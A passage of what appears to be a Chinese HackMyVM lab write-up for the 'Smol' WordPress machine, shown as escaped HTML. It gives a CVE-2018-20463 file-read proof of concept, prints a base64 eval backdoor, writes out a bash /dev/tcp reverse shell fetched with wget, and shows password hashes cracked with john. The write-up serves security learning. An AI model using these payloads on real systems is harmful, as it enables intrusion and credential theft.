                                      \n[+] Data Received: 372.886 KB                                                 \n[+] Memory used: 184.168 MB                                                                                                                                  \n[+] Elapsed time: 00:00:02           \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eWordPress\u003c/code\u003e版本和之前扫描的一样，扫描出一个插件\u003ccode\u003ejsmol2wp\u003c/code\u003e ，到互联网上找一下漏洞\u003c/p\u003e\n\u003ch3\u003ejsmol2wp 利用\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://cn-sec.com/archives/1247521.html\"\u003ehttps://cn-sec.com/archives/1247521.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在网上找到一个该插件的任意文件读取漏洞 \u003cstrong\u003eCVE-2018-20463\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e影响范围：WordPress JSmol2WP Plugin 1.07\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePOC:\nhttp://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\u0026#x26;call=getRawDataFromDatabase\u0026#x26;query=php://\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e/resource=../../../../wp-config.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image49.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/** Database username */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'wpuser'\u003c/span\u003e );\n\n/** Database password */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'kbLSF2Vop#lw3rjDZ629*Z%G'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到数据库用户名密码，尝试登陆\u003ccode\u003eWordPress\u003c/code\u003e ，登陆成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image50.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eWordPress 利用\u003c/h3\u003e\n\u003cp\u003e尝试了下在新建文章里面执行\u003ccode\u003ePHP\u003c/code\u003e代码，但是不成功，模板的方法反弹\u003ccode\u003eshell\u003c/code\u003e需要管理员用户才能进行\u003c/p\u003e\n\u003cp\u003e然后在控制面板的\u003ccode\u003eDashboard\u003c/code\u003e里面可以找到一个私人的\u003ccode\u003epage\u003c/code\u003e ，是管理员的任务清单\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image51.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会发现他们在说关于后门的插件的事情， “\u003ccode\u003eHello Dolly\u003c/code\u003e ”插件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image52.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e扫描网站目录\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~]                                                                                                                                          \n└─\u003cspan class=\"hljs-comment\"\u003e# dirsearch -u http://www.smol.hmv -x 403 -e php,zip,txt\u003c/span\u003e\n[02:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] Starting:                                                                                                                                         \n[02:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -    0B  - /index.php  -\u003e  http://www.smol.hmv/                                                                                               \n[02:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -   19KB - /index.php/login/                                                                                                                  \n[02:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    7KB - /license.txt                                                                                                                       \n[02:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /readme.html                                                                                                                       \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  315B  - /wp-admin  -\u003e  http://www.smol.hmv/wp-admin/                                                                                       \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e -    1B  - /wp-admin/admin-ajax.php                                                                                                           \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /wp-admin/  -\u003e  http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F\u0026#x26;reauth=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e                      \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-config.php                                                                                                                     \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  495B  - /wp-admin/install.php                                                                                                              \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -    3KB - /wp-admin/setup-config.php                                                                                                         \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-content/ \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   84B  - /wp-content/plugins/akismet/akismet.php                                                                                            \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -    0B  - /wp-content/plugins/hello.php                                                                                                      \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  521B  - /wp-content/uploads/                                                                                                               \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  414B  - /wp-content/upgrade/                                                                                                               \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  318B  - /wp-includes  -\u003e  http://www.smol.hmv/wp-includes/                                                                                 \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-includes/rss-functions.php                                                                                                     \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-cron.php                                                                                                                       \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /wp-login.php                                                                                                                      \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /wp-signup.php  -\u003e  http://www.smol.hmv/wp-login.php?action=register                                                               \n[02:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    4KB - /wp-includes/\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003ehello.php 插件利用\u003c/h3\u003e\n\u003cp\u003e可以发现在插件目录存在\u003ccode\u003ehello.php\u003c/code\u003e文件，我们使用任意文件读取漏洞读取一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\u0026#x26;call=getRawDataFromDatabase\u0026#x26;query=php://filter/resource=../../../../wp-content/plugins/hello.php\u003c/span\u003e\n\n\u0026#x3C;?php\n/**\n * @package Hello_Dolly\n * @version \u003cspan class=\"hljs-number\"\u003e1.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\n */\n/*\nPlugin Name: Hello Dolly\nPlugin URI: http://wordpress.org/plugins/hello-dolly/\nDescription: This \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e just a plugin, it symbolizes the hope \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e enthusiasm of an entire generation summed up \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u0026#x3C;cite\u003eHello, Dolly\u0026#x3C;/cite\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the upper right of your admin screen on every page.\nAuthor: Matt Mullenweg\nVersion: \u003cspan class=\"hljs-number\"\u003e1.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nAuthor URI: http://ma.tt/\n*/\n\nfunction hello_dolly_get_lyric() {\n\t/** These are the lyrics to Hello Dolly */\n\t$lyrics = \u003cspan class=\"hljs-string\"\u003e\"Hello, Dolly\nWell, hello, Dolly\nIt's so nice to have you back where you belong\nYou're lookin' swell, Dolly\nI can tell, Dolly\nYou're still glowin', you're still crowin'\nYou're still goin' strong\nI feel the room swayin'\nWhile the band's playin'\nOne of our old favorite songs from way back when\nSo, take her wrap, fellas\nDolly, never go away again\nHello, Dolly\nWell, hello, Dolly\nIt's so nice to have you back where you belong\nYou're lookin' swell, Dolly\nI can tell, Dolly\nYou're still glowin', you're still crowin'\nYou're still goin' strong\nI feel the room swayin'\nWhile the band's playin'\nOne of our old favorite songs from way back when\nSo, golly, gee, fellas\nHave a little faith in me, fellas\nDolly, never go away\nPromise, you'll never go away\nDolly'll never go away again\"\u003c/span\u003e;\n\n\t// Here we split it into lines.\n\t$lyrics = explode( \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e, $lyrics );\n\n\t// And then randomly choose a line.\n\t\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e wptexturize( $lyrics[ mt_rand( \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, count( $lyrics ) - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ) ] );\n}\n\n// This just echoes the chosen line, we\u003cspan class=\"hljs-string\"\u003e'll position it later.\nfunction hello_dolly() {\n\teval(base64_decode('\u003c/span\u003eCiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=\u003cspan class=\"hljs-string\"\u003e'));\n\t\n\t$chosen = hello_dolly_get_lyric();\n\t$lang   = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tif ( '\u003c/span\u003een_\u003cspan class=\"hljs-string\"\u003e' !== substr( get_user_locale(), 0, 3 ) ) {\n\t\t$lang = '\u003c/span\u003e lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\t}\n\n\tprintf(\n\t\t'\u003c/span\u003e\u0026#x3C;p \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"dolly\"\u003c/span\u003e\u003e\u0026#x3C;span \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"screen-reader-text\"\u003c/span\u003e\u003e%s \u0026#x3C;/span\u003e\u0026#x3C;span \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ltr\"\u003c/span\u003e%s\u003e%s\u0026#x3C;/span\u003e\u0026#x3C;/p\u003e\u003cspan class=\"hljs-string\"\u003e',\n\t\t__( '\u003c/span\u003eQuote \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e Hello Dolly song, by Jerry Herman:\u003cspan class=\"hljs-string\"\u003e' ),\n\t\t$lang,\n\t\t$chosen\n\t);\n}\n\n// Now we set that function up to execute when the admin_notices action is called.\nadd_action( '\u003c/span\u003eadmin_notices\u003cspan class=\"hljs-string\"\u003e', '\u003c/span\u003ehello_dolly\u003cspan class=\"hljs-string\"\u003e' );\n\n// We need some CSS to position the paragraph.\nfunction dolly_css() {\n\techo \"\n\t\u0026#x3C;style type='\u003c/span\u003etext/css\u003cspan class=\"hljs-string\"\u003e'\u003e\n\t#dolly {\n\t\tfloat: right;\n\t\tpadding: 5px 10px;\n\t\tmargin: 0;\n\t\tfont-size: 12px;\n\t\tline-height: 1.6666;\n\t}\n\t.rtl #dolly {\n\t\tfloat: left;\n\t}\n\t.block-editor-page #dolly {\n\t\tdisplay: none;\n\t}\n\t@media screen and (max-width: 782px) {\n\t\t#dolly,\n\t\t.rtl #dolly {\n\t\t\tfloat: none;\n\t\t\tpadding-left: 0;\n\t\t\tpadding-right: 0;\n\t\t}\n\t}\n\t\u0026#x3C;/style\u003e\n\t\";\n}\n\nadd_action( '\u003c/span\u003eadmin_head\u003cspan class=\"hljs-string\"\u003e', '\u003c/span\u003edolly_css\u003cspan class=\"hljs-string\"\u003e' );\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到就是提到的插件，其中有令人在意的内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(base64_decode(\u003cspan class=\"hljs-string\"\u003e'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003ebase64\u003c/code\u003e解码后得到：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (isset($_GET[\u003cspan class=\"hljs-string\"\u003e\"\\143\\155\\x64\"\u003c/span\u003e])) { system($_GET[\u003cspan class=\"hljs-string\"\u003e\"\\143\\x6d\\144\"\u003c/span\u003e]); } \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e实际上就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (isset($_GET[\u003cspan class=\"hljs-string\"\u003e\"cmd\"\u003c/span\u003e])) { system($_GET[\u003cspan class=\"hljs-string\"\u003e\"cmd\"\u003c/span\u003e]); } \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后，插件通过 \u003ccode\u003eadd_action('admin_notices', 'hello_dolly');\u003c/code\u003e 将 \u003ccode\u003ehello_dolly()\u003c/code\u003e 函数绑定到 \u003ccode\u003eadmin_notices\u003c/code\u003e 钩子。这意味着只要进入 WordPress 的后台页面，就会自动调用 \u003ccode\u003ehello_dolly()\u003c/code\u003e 函数，在页面右上角显示一段随机歌词\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image53.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么我们在后台页面进行测试，成功读取文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image54.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e反弹shell\u003c/h3\u003e\n\u003cp\u003e不能直接进行反弹，我们需要通过创建传递恶意文件，再通过后门来执行\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e创建恶意文件\u003ccode\u003eshell.sh\u003c/code\u003e（反弹\u003ccode\u003eshell\u003c/code\u003e使用）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# shell.sh\u003c/span\u003e\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/4444 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后开启\u003ccode\u003ehttp\u003c/code\u003e服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─\u003cspan class=\"hljs-comment\"\u003e# php -S 0:80  \u003c/span\u003e\n[Wed Feb  \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e] PHP \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.24\u003c/span\u003e Development Server (http://\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e) started\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后通过后门读取文件然后保存到临时文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://www.smol.hmv/wp-admin/index.php?cmd=wget \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e/shell.sh -O /tmp/shell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~]\n└─\u003cspan class=\"hljs-comment\"\u003e# nc -lvp 4444\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最后通过后门来执行刚刚保存的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://www.smol.hmv/wp-admin/index.php?cmd=/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash /tmp/shell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最终得到\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~]\n└─\u003cspan class=\"hljs-comment\"\u003e# nc -lvp 4444  \u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e ...\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e www.smol.hmv [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e42818\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e788\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@smol:/var/www/wordpress/wp-admin$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emysql\u003e select * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e wp_users;\nselect * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e wp_users;\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n|  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e | admin      | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin         | admin@smol.thm     | http://www.smol.hmv | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | admin                  |\n|  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:04:07 |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | wordpress user         |\n|  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e | think      | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think         | josemlwdf@smol.thm | http://smol.thm     | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:01:02 |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | Jose Mario Llado Marti |\n|  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e | gege       | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege          | gege@smol.thm      | http://smol.thm     | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | gege                   |\n|  \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@smol.thm     | http://smol.thm     | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | diego                  |\n|  \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e | xavi       | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi          | xavi@smol.thm      | http://smol.thm     | \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:01 |                     |           \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e | xavi                   |\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e rows \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00\u003c/span\u003e sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e数据库\u003c/h3\u003e\n\u003cp\u003e因为我们之前得到了数据库的用户名和密码，所以我们拉取一下数据库的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p\nmysql -u wpuser -p\nEnter password: kbLSF2Vop\u003cspan class=\"hljs-comment\"\u003e#lw3rjDZ629*Z%G\u003c/span\u003e\n\nWelcome to the MySQL monitor.  Commands end \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e ; \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \\g.\nYour MySQL connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e61371\u003c/span\u003e\nServer version: \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e-0ubuntu0\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e (Ubuntu)\n\nCopyright (c) \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e, Oracle \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e/\u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e its affiliates.\n\nOracle \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e a registered trademark of Oracle Corporation \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e/\u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e its\naffiliates. Other names may be trademarks of their respective\nowners.\n\n\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e statement.\n\nmysql\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后拿到开膛手杰克进行破解，最后能爆破出一个密码 \u003ccode\u003esandiegocalifornia\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejohn --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e encoding: UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nLoaded \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e password hashes \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e different salts (phpass [phpass ($P$ \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e $H$) \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e AVX2 8x3])\nCost \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (iteration count) \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8192\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e loaded hashes\nWill run \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Ctrl-C to abort, almost \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e other key 